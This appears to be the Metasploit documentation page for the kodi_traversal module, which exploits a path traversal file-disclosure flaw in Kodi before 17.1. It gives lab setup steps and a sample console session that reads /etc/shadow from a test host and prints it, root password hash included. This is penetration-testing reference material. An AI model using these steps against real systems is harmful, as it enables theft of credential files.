## Vulnerable Application

This module exploits an arbitrary file disclosure vulnerability in Kodi before 17.1.

**Vulnerable Application Installation Steps**

Grab whatever image from [libreelec](https://libreelec.tv/downloads/) if
you're lazy, like the [one for the Rpi2](http://releases.libreelec.tv/LibreELEC-RPi2.arm-7.0.3.img.gz),
or [install kodi from scratch](http://kodi.wiki/view/HOW-TO:Install_Kodi_for_Linux).

You'll need a version lower than 17.1 of Kodi.

## Verification Steps

A successful run of the exploit will look like this:

```
msf > use auxiliary/scanner/http/kodi_traversal
msf auxiliary(kodi_traversal) > set RPORT 8080
RPORT => 8080
msf auxiliary(kodi_traversal) > set RHOSTS 192.168.0.31
RHOSTS => 192.168.0.31
msf auxiliary(kodi_traversal) > set FILE /etc/shadow
FILE => /etc/shadow
msf auxiliary(kodi_traversal) > run

[*] Reading '/etc/shadow'
[+] /etc/shadow stored as '/home/jvoisin/.msf4/loot/20170219214657_default_192.168.0.31_kodi_114009.bin'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(kodi_traversal) > cat /home/jvoisin/.msf4/loot/20170219214657_default_192.168.0.31_kodi_114009.bin
[*] exec: cat /home/jvoisin/.msf4/loot/20170219214657_default_192.168.0.31_kodi_114009.bin

systemd-network:*:::::::
root:$6$ktSJvEl/p.r7nsR6$.EZhW6/TPiY.7qz.ymYSreJtHcufASE4ykx7osCfBlDXiEKqXoxltsX5fE0mY.494pJOKyuM50QfpLpNKvAPC.:::::::
nobody:*:::::::
dbus:*:::::::
system:*:::::::
sshd:*:::::::
avahi:*:::::::
```
